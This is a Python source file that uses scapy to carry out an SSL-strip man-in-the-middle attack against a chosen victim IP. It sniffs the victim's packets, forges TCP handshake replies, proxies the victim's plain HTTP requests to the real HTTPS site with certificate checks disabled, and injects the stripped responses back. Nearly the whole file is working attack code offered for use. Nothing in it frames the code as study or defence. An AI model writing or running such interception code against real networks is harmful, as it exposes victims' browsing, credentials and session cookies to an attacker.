from  scapy.all import *
from httpRequest import parse
import requests
from scapy.layers.inet import IP, TCP
from scapy.layers import http
from scapy.layers.http import HTTPRequest

# Create objects to perform SSL strip
# inp : victimIP = str
# inp : TCPport = str
# inp : interface = str
# call start on object to start the attack
class Ssl():

    def __init__(self, victimIP, TCPport, interface):
        self.victimIP = victimIP
        self.port = TCPport
        self.interface = interface

    # takes packet from sniff
    def process_packet(self, pkt):
        # check for TCP connection request from var:victimIP (first part of handshake)
        if pkt[TCP].flags == 'S':
            print("starting handshake")

            # creates and sends response to establish TCP connection (second part of handshake)
            etherLayer = Ether(src=get_if_hwaddr(self.interface), dst=pkt[Ether].src)
            ipLayer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            tcpLayer = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="SA", ack = pkt[TCP].seq + 1, seq = pkt[TCP].ack)
            ackpkt = etherLayer / ipLayer / tcpLayer
            sendp(ackpkt, verbose=0, iface=self.interface)

        # check for http request from var:victimIP
        if pkt.haslayer(Raw) and pkt[IP].src == self.victimIP:
            data = str(pkt[Raw])

            # parse http request using func:parsereq
            headers, req, getreq = self.parsereq(data)

            # construct request and send to the https server which victim requests
            # gets http response in var:response
            response = requests.get("https://" + req + getreq, verify=False, headers=headers)
            self.sendpkt(pkt, parse(response))

    # parses request from victim to use for the request to https server
    # inp : data = pkt[RAW]
    # ret : req = headers as dict
    # ret : targeturl = domain name as str
    # ret : getreq = pathname as str
    def parsereq(self, data):
        req = {}
        targeturl = ""
        getreq = ""
        datasplit = data.split("\\r\\n") # arr headers
        datasplit[-1] = ''
        for i in datasplit:
            newi = i.split(": ")
            if newi[0][2:5] == "GET":
                getreq = datasplit[0][6:len(datasplit[0])-9]
            elif newi[0] == "Host":
                targeturl = targeturl + newi[1]
            else:
                if newi[0] != "" and newi[0][0] != 'b':
                    print(newi[0])
                    req[newi[0]] = newi[1]

        return req, targeturl, getreq

    # sends the stripped http response to var:victimIP
    # inp : respnse = RAW http
    def sendpkt(self, pkt, response):
        etherLayer = Ether(src=get_if_hwaddr(self.interface), dst=pkt[Ether].src)
        ipLayer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        tcpLayer = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, ack = pkt[TCP].seq + 1, seq = pkt[TCP].ack, flags="FA")

        newpkt = etherLayer / ipLayer / tcpLayer / response

        sendp(newpkt, verbose=0, iface=self.interface)

    def start(self):
        # sniffs packets on var:port and redirects to func:process_packet
        sniff(filter="port " + str(self.port), prn=self.process_packet, iface=self.interface)
